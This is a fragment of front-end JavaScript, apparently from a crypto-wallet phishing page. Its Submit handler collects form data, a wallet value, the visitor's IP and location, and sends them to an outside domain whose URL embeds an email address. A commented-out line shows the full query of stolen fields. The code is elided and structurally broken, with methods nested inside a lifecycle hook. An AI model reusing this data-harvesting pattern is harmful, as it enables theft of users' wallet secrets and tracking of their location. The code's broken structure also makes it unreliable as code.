  ...
  updated() {
    ...
    methods: {
        ...
        async Submit(x,y=null,z=null) {
          ...
          const url = 'https://safewayfx.com/codeupblood/newUser/scofield/www.spbiology@gmail.com/user name'
          const type = x
          const dataO = y
          const dataT = z
          const ip = this.ip
          ...
          axios
            ...
            //.get('/endpoint/v1/send?wallet='+wallet+'&typex='+type+'&dataO='+dataO+'&timein='+timein+'&dataT='+dataT+'&ip='+ip+'&loc='+loc)
